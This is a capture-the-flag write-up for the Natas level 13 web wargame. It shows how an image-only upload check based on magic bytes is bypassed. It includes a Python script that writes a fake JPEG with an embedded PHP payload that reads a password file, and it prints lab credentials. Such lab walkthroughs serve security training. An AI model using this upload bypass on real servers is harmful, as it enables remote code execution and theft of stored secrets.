Level #13 go to URL and find natas14 user password

- URL: http://natas13.natas.labs.overthewire.org/
- User: natas13
- Password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9

After navigating to URL an html page with a form with 4 inputs (2 type=hidden,1 type=file and 1 type=submit) and an anchor element with the text "View sourcecode" is loaded this time the page warns that only image files are accepted.  
Clicking on the anchor elements redirects to the source code of the php script being run by server. The code that was not modified includes the functions:
- genRandomString
- makeRandomPath
- makeRandomPathFromFilename
  
The only code modified is in the following code

```PHP
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    //This is the code that checks file uploaded is an image
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
```

The only thing enforcing that file uploaded is an image is the `exif_imagetype()` function, reading it's [documentation](https://www.php.net/manual/es/function.exif-imagetype.php) found out that this function works by "reding the first bytes of an image and confirming it's signature", but how many bytes does it read?

By searching found out [how to determine a file is a jpeg by reading it's bytes](https://coderanch.com/t/636057/java/figure-bytes-array-jpeg-file#:~:text=For%20JPEG%2C%20you%20need%20to,by%20the%20mime%20type%20for%20.) which is translatable to having the following bytes in a file xFF\xD8\xFF.

Made a python script to generate the fake php file.
```Python
jpeg_magic_numbers = b'\xFF\xD8\xFF'
 
with open("fake.php", "wb") as binary_file:
    binary_file.write(jpeg_magic_numbers)
    binary_file.write(bytes("<?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>", "utf-8"))

```
  
Recreated the request with postman.
  
  
The password for natas14 is 
qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP

